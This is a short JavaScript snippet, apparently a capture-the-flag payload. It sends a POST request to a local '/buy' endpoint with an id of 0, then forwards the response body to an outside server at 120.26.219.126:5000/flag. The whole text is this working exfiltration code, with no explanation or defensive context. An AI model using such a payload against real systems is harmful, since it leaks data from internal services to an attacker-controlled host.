const fdata = new URLSearchParams();
fdata.append('id', '0');
fetch("http://localhost/buy", {
    method: "POST",
    body: fdata
}).then((res) => {
    return res.text();
}).then((data) => {
    fetch("http://120.26.219.126:5000/flag", {
        method: "POST",
        body: data
    });
})
